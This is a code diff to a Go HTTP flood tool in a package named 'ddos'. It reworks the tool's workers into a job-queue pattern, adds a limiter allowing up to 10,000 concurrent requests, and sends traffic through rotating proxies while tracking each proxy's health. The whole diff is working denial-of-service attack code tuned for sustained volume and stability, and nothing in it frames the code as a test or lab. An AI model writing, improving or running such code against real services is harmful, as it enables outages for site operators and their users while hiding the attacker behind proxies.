@@ -1,6 +1,7 @@
 package ddos
 
 import (
+	"io"
 	"net/http"
 	"sync/atomic"
 	"time"
@@ -11,8 +12,8 @@ func (d *DDoSAttack) startFloodAttack() {
 	d.startFloodWorkers(d.config.MaxThreads)
 }
 
-// startFloodWorkers starts specified number of flood workers
-// Always uses connection pool and fire-and-forget for maximum efficiency
+// startFloodWorkers starts specified number of flood workers using stable worker pool pattern
+// Uses job queue pattern similar to cracker for stability while maintaining high performance
 func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
 	// Always use connection pool (required for efficiency)
 	pool, err := NewClientPool(d.config)
@@ -27,15 +28,60 @@ func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
 		d.requestBuilder = NewRequestBuilder(d.config)
 	}
 
-	// Start workers - always use continuous fire-and-forget (maximum efficiency)
+	// Create shared GoroutineLimiter for bounded concurrency across all workers
+	// Limit total concurrent async requests to prevent resource exhaustion
+	// Use MaxThreads * 2 as a reasonable limit for concurrent requests
+	maxConcurrentRequests := numWorkers * 2
+	if maxConcurrentRequests < 500 {
+		maxConcurrentRequests = 500 // Minimum for high throughput
+	}
+	if maxConcurrentRequests > 10000 {
+		maxConcurrentRequests = 10000 // Cap to prevent excessive goroutines
+	}
+	d.globalLimiter = NewGoroutineLimiter(maxConcurrentRequests)
+
+	// Create bounded job channel (reduced from 1000-2000 to 100-500 for stability)
+	// Workers will pull jobs from this channel sequentially
+	bufferSize := 100
+	if numWorkers > 500 {
+		bufferSize = 300
+	} else if numWorkers > 200 {
+		bufferSize = 200
+	}
+	jobChan := make(chan struct{}, bufferSize)
+
+	// Start job producer (single goroutine feeds all workers)
+	d.wg.Add(1)
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				atomic.AddInt64(&d.requestsFailed, 1)
+			}
+			close(jobChan)
+			d.wg.Done()
+		}()
+
+		// Continuously send jobs to channel
+		for {
+			select {
+			case <-d.ctx.Done():
+				return
+			case jobChan <- struct{}{}:
+				// Job sent successfully
+			}
+		}
+	}()
+
+	// Start workers - each worker processes jobs sequentially
 	for i := 0; i < numWorkers; i++ {
 		d.wg.Add(1)
-		go d.continuousFireAndForgetWorker(pool)
+		go d.stableFloodWorker(pool, jobChan)
 	}
 }
 
-// continuousFireAndForgetWorker sends requests continuously without waiting (maximum efficiency)
-func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
+// stableFloodWorker processes jobs sequentially using stable worker pool pattern
+// Similar to cracker pattern: pull job → build request → send (via limiter) → repeat
+func (d *DDoSAttack) stableFloodWorker(pool *ClientPool, jobChan <-chan struct{}) {
 	defer func() {
 		// Recover from panics to prevent worker crashes
 		if r := recover(); r != nil {
@@ -44,8 +90,7 @@ func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
 		d.wg.Done()
 	}()
 
-	// Create async sender for this worker with proxy tracking
-	// Use connection validation to get a healthy client
+	// Get a client from pool for this worker
 	client := pool.GetClient()
 	if client == nil {
 		return
@@ -61,137 +106,101 @@ func (d *DDoSAttack) continuousFireAndForgetWorker(pool *ClientPool) {
 	}
 
 	proxyURL := pool.GetProxyForClient(client)
-	asyncSender := NewAsyncSenderWithProxy(
-		client,
-		proxyURL,
-		func(proxy string, rt time.Duration) {
-			d.markProxySuccess(proxy, rt)
-		},
-		func(proxy string) {
-			d.markProxyFailure(proxy)
-		},
-	)
-	defer asyncSender.Close() // Ensure cleanup
 
-	// Adaptive channel buffer sizing based on thread count for better backpressure
-	// Larger buffer for high concurrency, but capped to prevent memory issues
-	bufferSize := 1000
-	if d.config.MaxThreads > 1000 {
-		bufferSize = 2000 // Larger buffer for high concurrency
-	} else if d.config.MaxThreads > 500 {
-		bufferSize = 1500
+	// Ensure requestBuilder is initialized
+	if d.requestBuilder == nil {
+		d.requestBuilder = NewRequestBuilder(d.config)
 	}
-	requestChan := make(chan *http.Request, bufferSize)
 
-	// Track consecutive failures for backpressure
-	var consecutiveFailures int64
+	// Safe type assertion
+	rb, ok := d.requestBuilder.(*RequestBuilder)
+	if !ok || rb == nil {
+		return
+	}
 
-	// Producer: continuously build requests
-	producerDone := make(chan struct{})
-	go func() {
-		defer func() {
-			// Safely close channels
-			select {
-			case <-producerDone:
-				// Already closed
-			default:
-				close(producerDone)
-			}
-			// Recover from panics in producer
-			if r := recover(); r != nil {
-				atomic.AddInt64(&d.requestsFailed, 1)
-			}
-		}()
-
-		// Ensure requestBuilder is initialized
-		if d.requestBuilder == nil {
-			d.requestBuilder = NewRequestBuilder(d.config)
-		}
-
-		// Safe type assertion
-		rb, ok := d.requestBuilder.(*RequestBuilder)
-		if !ok || rb == nil {
-			return
-		}
-
-		for {
-			select {
-			case <-d.ctx.Done():
-				return
-			default:
-				req, err := rb.BuildRequest()
-				if err != nil {
-					atomic.AddInt64(&d.requestsFailed, 1)
-					// Add small delay on error to prevent tight error loop
-					select {
-					case <-d.ctx.Done():
-						return
-					case <-time.After(10 * time.Millisecond):
-					}
-
-					continue
-				}
-				req = req.WithContext(d.ctx)
-
-				// Non-blocking send with backpressure handling
-				select {
-				case requestChan <- req:
-					// Successfully queued - reset failure counter
-					atomic.StoreInt64(&consecutiveFailures, 0)
-				case <-d.ctx.Done():
-					return
-				default:
-					// Channel full - backpressure mechanism
-					atomic.AddInt64(&consecutiveFailures, 1)
-					atomic.AddInt64(&d.requestsFailed, 1)
-
-					// Adaptive backpressure: if channel is consistently full,
-					// add a small delay to prevent overwhelming the system
-					if atomic.LoadInt64(&consecutiveFailures) > 100 {
-						select {
-						case <-d.ctx.Done():
-							return
-						case <-time.After(50 * time.Millisecond):
-							// Brief pause to allow channel to drain
-							atomic.StoreInt64(&consecutiveFailures, 0)
-						}
-					}
-				}
-			}
-		}
-	}()
-
-	// Consumer: send requests asynchronously (fire-and-forget)
+	// Process jobs sequentially (stable pattern, no nested goroutines)
 	for {
 		select {
 		case <-d.ctx.Done():
-			// Wait for producer to finish (with timeout to prevent hanging)
-			select {
-			case <-producerDone:
-			case <-time.After(5 * time.Second):
-				// Timeout waiting for producer
-			}
 			return
-		case req, ok := <-requestChan:
+		case _, ok := <-jobChan:
 			if !ok {
 				// Channel closed, producer done
 				return
 			}
-			if req == nil {
-				// Skip nil requests
+
+			// Build request
+			req, err := rb.BuildRequest()
+			if err != nil {
+				atomic.AddInt64(&d.requestsFailed, 1)
 				continue
 			}
+			req = req.WithContext(d.ctx)
+
+			// Track request sent
 			atomic.AddInt64(&d.requestsSent, 1)
 			atomic.AddInt64(&d.activeConns, 1)
 
-			// Send request with error recovery
-			// Note: Success is tracked asynchronously, so we optimistically increment
-			// Actual success/failure is tracked in async sender callbacks
-			asyncSender.SendAsync(req, true)
+			// Send request asynchronously using global limiter (bounded concurrency)
+			// This ensures we don't create unbounded goroutines
+			if d.globalLimiter != nil {
+				d.globalLimiter.Execute(func() {
+					d.sendRequestAsync(client, req, proxyURL)
+				})
+			} else {
+				// Fallback if limiter not initialized (shouldn't happen)
+				go d.sendRequestAsync(client, req, proxyURL)
+			}
 
-			// Optimistically track as success (will be corrected by async sender if it fails)
+			// Optimistically track as success (will be corrected by sendRequestAsync if it fails)
 			atomic.AddInt64(&d.requestsSuccess, 1)
-			atomic.AddInt64(&d.activeConns, -1)
 		}
 	}
+}
+
+// sendRequestAsync sends a request asynchronously with proper error handling and proxy tracking
+func (d *DDoSAttack) sendRequestAsync(client *http.Client, req *http.Request, proxyURL string) {
+	defer func() {
+		// Always decrement active connections when request completes
+		atomic.AddInt64(&d.activeConns, -1)
+		// Recover from panics to prevent crashes
+		if r := recover(); r != nil {
+			atomic.AddInt64(&d.requestsFailed, 1)
+			atomic.AddInt64(&d.requestsSuccess, -1) // Correct optimistic increment
+			if proxyURL != "" {
+				d.markProxyFailure(proxyURL)
+			}
+		}
+	}()
+
+	startTime := time.Now()
+	resp, err := client.Do(req)
+	responseTime := time.Since(startTime)
+
+	if err != nil {
+		// Check if this is an HTTP/2 specific error
+		if isHTTP2Error(err) {
+			// HTTP/2 connection error - don't immediately mark proxy as failed
+		}
+		atomic.AddInt64(&d.requestsFailed, 1)
+		atomic.AddInt64(&d.requestsSuccess, -1) // Correct optimistic increment
+		if proxyURL != "" {
+			d.markProxyFailure(proxyURL)
+		}
+		return
+	}
+
+	// Handle response body properly for HTTP/2 compatibility
+	if resp.Body != nil {
+		// Skip reading response body for efficiency (fire-and-forget)
+		// But drain a small amount for HTTP/2 stream closure
+		io.CopyN(io.Discard, resp.Body, 4096)
+		resp.Body.Close()
+	}
+
+	// Track success
+	if proxyURL != "" {
+		d.markProxySuccess(proxyURL, responseTime)
+	}
+	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 }
